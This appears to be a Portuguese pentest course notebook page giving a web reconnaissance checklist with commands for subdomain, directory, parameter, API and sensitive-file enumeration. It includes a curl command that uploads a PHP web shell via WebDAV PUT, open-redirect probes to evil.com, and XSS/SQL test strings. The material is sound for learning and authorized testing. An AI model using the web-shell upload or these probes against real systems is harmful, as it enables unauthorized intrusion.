
**Ver exemplos de brute force HTTP/Web:** [[03.03 - Brute Force e Quebra de Senhas#3. Brute Force HTTP]]

## 1. Reconhecimento Inicial

### 1.1 Identificação de Tecnologias
```bash
# Verificar tecnologias com whatweb
whatweb TARGET_URL

# Verificar tecnologias com wappalyzer (via navegador)
# Instalar extensão Wappalyzer no navegador

# Verificar headers HTTP
curl -I TARGET_URL
curl -v TARGET_URL
```

### 1.2 Identificação de WAF
```bash
# Identificar WAF com wafw00f
wafw00f TARGET_URL

# Identificar WAF com nmap
nmap --script=http-waf-detect TARGET_IP

# Teste manual de WAF
curl -X POST TARGET_URL -d "test=<script>alert(1)</script>"
```

### 1.3 Verificação de Certificados SSL
```bash
# Verificar certificado SSL
openssl s_client -connect TARGET_URL:443 -showcerts </dev/null 2>/dev/null | openssl x509 -text -noout

# Verificar subdomínios no certificado
openssl s_client -connect TARGET_URL:443 -showcerts </dev/null 2>/dev/null | openssl x509 -text -noout | grep -A 5 "Subject Alternative Name"

# Exemplo específico do curso
openssl s_client -connect 10.10.155.10:8443 -showcerts </dev/null 2>/dev/null | openssl x509 -text -noout
```

### 1.4 Enumeração DNS
```bash
# Primeiro devemos tentar identificar serviço de DNS server, se encontrar, tentar transferência de zona, se não der, devemos tentar consulta direta com o comando host perguntando ao servidor de DNS, olhar todos os tipos de registros, tentar nomes relacionados ao host com final .local

# Checar transferência de zona (lista todos os subdomínios)
dig axfr dominio.com.br @ns2.dominio.com.br

# Consultas DNS básicas
dig dominio.com.br -t ns
dig dominio.com.br -t a
dig dominio.com.br -t mx
dig dominio.com.br -t cname
dig dominio.com.br -t aaaa
dig dominio.com.br -t txt
dig dominio.com.br -t ptr

# Consultando DNS com comando host
host -t ns dominio.com.br

# Tipo CNAME precisa de saber o subdomínio para poder descobrir para qual local o alias é enviado
host -t cname dev.dominio.com.br

# Usando transferência de zona
host -l -a dominio.com.br ns1.hostinger.com.br
host -l -a 177.22.223.22 ns1.hostinger.com.br
dig -t axfr dominio.com.br @ns1.hostinger.com.br
dnsenum --enum dominio.com.br
dnsrecon -d dominio.com.br
fierce -dns dominio.com.br

# DNS reverso com o comando host
host 177.22.223.22

# Consulta específica de tipo PTR (registro de DNS reverso)
host -t PTR 62.146.177.15 8.8.8.8

```

## 2. Enumeração de Subdomínios

```
# wordlists:
/usr/share/wordlists/seclists/Discovery/DNS/namelist.txt
/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

### 2.1 Enumeração com FFUF
```bash
# Enumeração básica de subdomínios
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://TARGET_IP -H "Host: FUZZ.TARGET_DOMAIN" -fs 10684

# Enumeração com filtros específicos
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://TARGET_IP -H "Host: FUZZ.TARGET_DOMAIN" -fc 403,404 -fs 10684

# Exemplo específico do curso
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://172.23.1.20 -H "Host:FUZZ.greenhost.local" -fs 10684
```

### 2.2 Enumeração com Gobuster
```bash
# Enumeração de subdomínios
gobuster vhost -u TARGET_DOMAIN -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt

# Enumeração com extensões
gobuster vhost -u TARGET_DOMAIN -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -x php,html,txt
```

## 3. Enumeração de Diretórios e Arquivos

```
# wordlists
/usr/share/wordlists/dirb/big.txt
/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
```

### 3.1 Enumeração com Gobuster
```bash
# Enumeração básica de diretórios com opcoes de nao exibir erros, e de seguir redirecionamentos -r e -e para mostrar links completos na saida
gobuster dir -u TARGET_URL -w /usr/share/wordlists/dirb/big.txt -t 50 -e --no-error -r -a "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"

# Enumeração com extensões específicas
gobuster dir -u TARGET_URL -w /usr/share/wordlists/dirb/big.txt -x php,txt,csv,sql,json,zip,tar,log,conf,xml -t 50

# Enumeração com user-agent customizado
gobuster dir -u TARGET_URL -w /usr/share/wordlists/dirb/big.txt -a "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" -t 50

# Exemplo específico do curso
gobuster dir -u http://TARGET_IP -w /usr/share/dirb/wordlists/big.txt -r -a "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36" -x php,txt,csv,sql,json,zip,tar,log,conf,xml -t 100

# AO ENCONTRAR UM DIRETORIO, RODAR NOVAMENTO O GOBUSTER NELE PARA ENCONTRAR MAIS DIRETORIOS
```

### 3.2 Enumeração com FFUF
```bash
# Enumeração de diretórios
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u TARGET_URL/FUZZ -fs 0

# Enumeração com filtros específicos
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u TARGET_URL/FUZZ -fc 403,404 -fs 0

# Enumeração com extensões
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u TARGET_URL/FUZZ -e php,html,txt,json -fs 0
```

### 3.3 Enumeração com Dirb
```bash
# Enumeração básica
dirb TARGET_URL /usr/share/wordlists/dirb/big.txt

# Enumeração com extensões
dirb TARGET_URL /usr/share/wordlists/dirb/big.txt -X .php,.html,.txt
```

### 3.4 Enumeração com Feroxbuster
```bash
# Instalação
sudo apt install feroxbuster

# Uso via terminal
feroxbuster -u http://homologacao.decstore.dsc:8080/sysadm/ -w /usr/share/wordlists/dirb/big.txt --rate-limit 150 -x php -A -t 90 --timeout 300 --scan-limit 1 --random-agent

# comando limpo:
feroxbuster -u http://homologacao.decstore.dsc:8080/sysadm/ -w /usr/share/wordlists/dirb/big.txt -n --random-agent

# usar o -n para nao ser recursivo, e pode tirar o --rate-limit e --scan-limit e --timeout
```

## 4. Enumeração de Parâmetros

### 4.1 Enumeração com FFUF
```bash
# Enumeração de parâmetros GET
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u TARGET_URL?FUZZ=test -fs 0

# Enumeração de parâmetros POST
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u TARGET_URL -X POST -d "FUZZ=test" -H "Content-Type: application/x-www-form-urlencoded" -fs 0

# Exemplo específico do curso
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://TARGET_IP -X POST -d "FUZZ=test" -H "Content-Type: application/x-www-form-urlencoded" -fw 2646
```

## 5. Enumeração de Endpoints API

### 5.1 Enumeração com FFUF
```bash
# Enumeração de endpoints API
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt -u TARGET_URL/FUZZ -fs 0

# Enumeração de endpoints REST
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/rest-endpoints.txt -u TARGET_URL/FUZZ -fs 0
```

### 5.2 Enumeração FinderLink
```bash
# Instalação
git clone https://github.com/GerbenJavado/LinkFinder.git
cd LinkFinder
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
python linkfinder.py -i https://example.com/1.js -o cli
```

## 6. Enumeração de Arquivos Sensíveis

### 6.1 Arquivos Comuns
```bash
# Verificar robots.txt
curl TARGET_URL/robots.txt

# Verificar sitemap.xml
curl TARGET_URL/sitemap.xml

# Verificar .htaccess
curl TARGET_URL/.htaccess

# gitexposed
curl TARGET_URL/.git/HEAD

# Verificar web.config
curl TARGET_URL/web.config

# Verificar crossdomain.xml
curl TARGET_URL/crossdomain.xml

# Verificar arquivos de configuração
curl TARGET_URL/config.php
curl TARGET_URL/config.ini
curl TARGET_URL/config.json
curl TARGET_URL/.env
```

### 6.2 Arquivos de Backup
```bash
# Enumeração com FFUF
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/Common-DB-Backups.txt -u TARGET_URL/FUZZ -fs 0

# Verificações manuais
curl TARGET_URL/backup.zip
curl TARGET_URL/backup.tar.gz
curl TARGET_URL/backup.sql
```

## 7. Enumeração de Tecnologias Web

### 7.1 Identificação de CMS
```bash
# Verificar WordPress
curl TARGET_URL/wp-admin/
curl TARGET_URL/wp-content/
curl TARGET_URL/wp-includes/

# Verificar Joomla
curl TARGET_URL/administrator/
curl TARGET_URL/components/

# Verificar Drupal
curl TARGET_URL/sites/default/
curl TARGET_URL/modules/
```

### 7.2 Identificação de Frameworks
```bash
# Usar o wappalizer

# Verificar Laravel
curl TARGET_URL/.env
curl TARGET_URL/storage/logs/

# Verificar Django
curl TARGET_URL/admin/
curl TARGET_URL/static/

# Verificar Spring Boot
curl TARGET_URL/actuator/
curl TARGET_URL/health
```

## 8. Enumeração de Headers HTTP

Interessante em caso de encontrar por exemplo webdav com PUT habilitado, ai da para fazer upload de arquivos.

### 8.1 Análise de Headers
```bash
# Headers básicos
curl -I TARGET_URL

# Headers detalhados
curl -v TARGET_URL

# Headers com diferentes métodos (testar com todos os diretorios encontrados)
curl -v -X OPTIONS TARGET_URL
curl -v -X HEAD TARGET_URL

# Utilizar o nc com Host (SEMPRE DEVE ENVIAR se for 1.1) no HTTP/1.1 para descobrir os cabeçalhos e tecnologias
nc 172.16.1.234 80
OPTIONS /dddd HTTP/1.1
Host: desec.com.br

# sempre pedir um get de um arquivo existente, por exemplo index.php ou index.aspx/default.aspx pois assim o servidor vai responder com a versão exata da linguagem

# Enumeração HTTPS / para não exibir muita coisa usar o -quiet
openssl s_client -connect desec.com.br:443
HEAD / HTTP/1.1
Host: desec.com.br

# se encontar um webdav com PUT:
curl -v -X PUT -d "<?php system(\$_GET['cmd']); ?>" http://ALVO/webdav/teste.php

# testar webdav
davtest --url http://ALVO/webdav/

# outro uso de metodos diferentes e para autenticação, pois as vezes um pagina só pede autenticação para um determinado tipo de methodo e para outros não

```
![](0b5fb2e97f83e3af4687d10d9d1a963e.png)

### 8.2 Verificação de Segurança
```bash
# Verificar CSP (Content Security Policy)
curl -I TARGET_URL | grep -i "content-security-policy"

# Verificar HSTS
curl -I TARGET_URL | grep -i "strict-transport-security"

# Verificar X-Frame-Options
curl -I TARGET_URL | grep -i "x-frame-options"

# Verificar X-XSS-Protection
curl -I TARGET_URL | grep -i "x-xss-protection"
```

## 9. Enumeração de Métodos HTTP

### 9.1 Teste de Métodos
```bash
# Testar métodos HTTP
nc -v TARGET_URL 80
OPTIONS /teste HTTP/1.0

curl -X GET TARGET_URL
curl -X POST TARGET_URL
curl -X PUT TARGET_URL
curl -X DELETE TARGET_URL
curl -X OPTIONS TARGET_URL
curl -X HEAD TARGET_URL
curl -X TRACE TARGET_URL
curl -X PATCH TARGET_URL

# fazer um script para cada rota ou diretório encontrado para testar metodos

```

### 9.2 Enumeração com Nmap
```bash
# Scripts HTTP específicos
nmap --script=http-methods TARGET_IP
nmap --script=http-method-tamper TARGET_IP
nmap --script=http-trace TARGET_IP
```

## 10. Enumeração de Redirecionamentos

### 10.1 Teste de Open Redirect
```bash
# Teste básico
curl -I "TARGET_URL/redirect.php?url=http://evil.com"

# Teste com diferentes parâmetros
curl -I "TARGET_URL/redirect.php?redirect=http://evil.com"
curl -I "TARGET_URL/redirect.php?next=http://evil.com"
curl -I "TARGET_URL/redirect.php?return=http://evil.com"
```

### 10.2 Enumeração com FFUF
```bash
# Enumeração de parâmetros de redirecionamento
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "TARGET_URL/FUZZ=http://evil.com" -fs 0
```

## 11. Enumeração de JS e Arquivos Estáticos

### 11.1 Extração de Links JavaScript
```bash
# Usando LinkFinder
python3 LinkFinder.py -i TARGET_URL -o links.html

# Usando JSFinder
python3 JSFinder.py -u TARGET_URL
```

### 11.2 Análise de Arquivos JS
```bash
# Baixar arquivos JS
wget -r -A.js TARGET_URL

# Analisar arquivos JS
grep -r "api\|endpoint\|url\|href" *.js
grep -r "password\|token\|key\|secret" *.js

# utilizando o HTML Tool
go install github.com/tomnomnom/hacks/html-tool@latest
ou
go get -u github.com/tomnomnom/hacks/html-tool

Usage: html-tool <mode> [<args>]

Modes:
	tags <tag-names>        Extract text contained in tags
	attribs <attrib-names>  Extract attribute values
	comments                Extract comments

Examples:
	cat urls.txt | html-tool tags title a strong
	find . -type f -name "*.html" | html-tool attribs src href
	cat urls.txt | html-tool comments
	
# utilizando o getJS
go get github.com/003random/getJS
~/go/bin/getJS --url TARGET --complete

# Utilizando o BURP para fazer o spidering das requisições em target
```

## 12. Enumeração de Cookies

### 12.1 Análise de Cookies
```bash
# Verificar cookies
curl -I TARGET_URL | grep -i "set-cookie"

# Analisar cookies com navegador
# Usar extensão Cookie Editor
```

### 12.2 Teste de Cookies
```bash
# Testar cookies com diferentes valores
curl -H "Cookie: session=admin" TARGET_URL
curl -H "Cookie: user=administrator" TARGET_URL
curl -H "Cookie: role=admin" TARGET_URL
```

## 13. Enumeração de Formulários

![](42d1d4fe94e92f94c1c3f5979e4bff2a.png)

### 13.1 Identificação de Formulários
```bash
# Verificar formulários de login
curl TARGET_URL | grep -i "form\|input\|submit"

# Verificar formulários de contato
curl TARGET_URL/contact | grep -i "form\|input\|submit"
```

### 13.2 Análise de Formulários
```bash
# Usando Burp Suite
# Interceptar requisições de formulários
# Analisar parâmetros enviados
```

## 14. Enumeração de Erros

### 14.1 Análise de Páginas de Erro
```bash
# Verificar páginas de erro comuns
curl TARGET_URL/404
curl TARGET_URL/500
curl TARGET_URL/error
curl TARGET_URL/error.php

```

### 14.2 Enumeração de Mensagens de Erro
```bash
# Testar parâmetros inválidos
curl "TARGET_URL/page.php?id=invalid"
curl "TARGET_URL/page.php?id='"
curl "TARGET_URL/page.php?id=<script>"
```

## 15. Checklist de Validação

- [ ] **Tecnologias identificadas**
- [ ] **WAF detectado (se houver)**
- [ ] **Subdomínios enumerados**
- [ ] **Diretórios e arquivos descobertos**
- [ ] **Parâmetros identificados**
- [ ] **Endpoints API encontrados**
- [ ] **Arquivos sensíveis verificados**
- [ ] **Headers HTTP analisados**
- [ ] **Métodos HTTP testados**
- [ ] **Redirecionamentos verificados**
- [ ] **Arquivos JS analisados**
- [ ] **Cookies examinados**
- [ ] **Formulários identificados**
- [ ] **Páginas de erro analisadas**
- [ ] **Olhar o código fonte da página, console.log**
- [ ] **Olhar paginas de robots.txt e sitemap.xml**
- [ ] **Usar o BURP para ver as requisições realizadas**
- [ ] **Consultar checklist de [[03.01 - Exploração Web]] para rotas encontradas**
- [ ] Verificar type confusion
- [ ] Verificar git exposed
- [ ] Verificar links sem controle de permissão com ferramenta LinkFinder
- [ ] Verificar se consegue quebrar jwt com hashcat
- [ ] Verificar LFI nos parametros
- [ ] Verificar XXE quando os requestes tiverem XML
- [ ] Resultados documentados

## 16. Ferramentas Complementares

### 16.1 Nikto
```bash
# Instalação
sudo apt install nikto

# Varredura básica
nikto -h TARGET_URL

# Varredura com plugins
nikto -h TARGET_URL -Plugins all
```

### 16.3 OWASP ZAP
```bash
# Instalação
sudo apt install zaproxy

# Uso via interface gráfica
zaproxy
```

## 17. Dicas Importantes

1. **Sempre usar rate limiting** para evitar sobrecarga
2. **Salvar resultados** de todas as enumerações
3. **Verificar logs** do servidor web
4. **Testar manualmente** descobertas importantes
5. **Usar diferentes wordlists** para cobertura completa
6. **Documentar tudo** para o relatório final
7. **Priorizar descobertas** baseado no objetivo
8. **Validar resultados** com múltiplas ferramentas


### 18. Checklist do curso Introdução ao Pentest Web

**Mapear Hosts**
- [ ] Identificar - Portas Abertas
- [ ] Identificar - Serviços Expostos
- [ ] Identificar - Interfaces Administrativas
- [ ] Verificar - Possibilidade de Brute Force

**Mapear Aplicação Web**
- [ ] Identificar - Web Application Firewall
- [ ] Identificar - Tecnologia Web Server, Frameworks
	Ferramentas: WhatWeb, Wappalyzer
- [ ] Identificar - Métodos Aceitos
- [ ] Identificar - Tecnologias da Aplicação
- [ ] Identificar - Robots.txt e sitemap.xml, tela de registro
- [ ] Identificar - APIs Expostas via Swagger, Postman Collections, etc
- [ ] Identificar - Comentários HTML
	- [ ] wget -m http://siteparabaixar.com.br
- [ ] Identificar - Arquivos JS
      ![](07bbc71869650c01072c7f636cdd6f31.png)
- [ ] Realizar - Spidering na Aplicação
- [ ] Realizar - Identificação de entry points
- [ ] Realizar - Brute Force (arquivos e diretórios)
	Ferramentas: OWASP ZAP, FFUF, Dirbuster, Gobuster,FeroxBuster
![](07bbc71869650c01072c7f636cdd6f31.png)
**Controle de Identidade**
- [ ] Spidering sem autenticação
- [ ] Spidering autenticado (limitado)
- [ ] Spidering autenticado (privilegiado)
- [ ] Verificar - Registro de conta
- [ ] Verificar - Recuperação de senha
- [ ] Verificar - Permissões de contas
- [ ] Verificar - Enumeração de usuários

**Controle de Autenticação**
- [ ] Identificar - Transporte de dados inseguro
- [ ] Identificar - Credenciais padrões
- [ ] Identificar - Bloqueio de Contas
- [ ] Possibilidade de Brute Force
- [ ] Bypass de controle de autenticação
- [ ] Análise da política de senhas
- [ ] Fraquezas nas funcionalidades de senha

**Controle de Autorização**
- [ ] Path Traversal / File include
- [ ] Server-Side Request Forgery
- [ ] Insecure Direct Object Reference
- [ ] Escalação de Privilégios
- [ ] Bypass no controle de autorização

**Validação de dados**
- [ ] Verificar - XSS Refletido
- [ ] Verificar - XSS Persistente
- [ ] Verificar - DOM Based XSS
- [ ] Verificar - HTML Injection
- [ ] Verificar - HTTP Parameter Pollution
- [ ] Verificar - SQL Injection
- [ ] Verificar - LDAP Injection
- [ ] Verificar - XML Injection
- [ ] Verificar - XPATH Injection
- [ ] Verificar - Code Injection
- [ ] Verificar - Open Redirect
- [ ] Verificar - Bypass File Upload
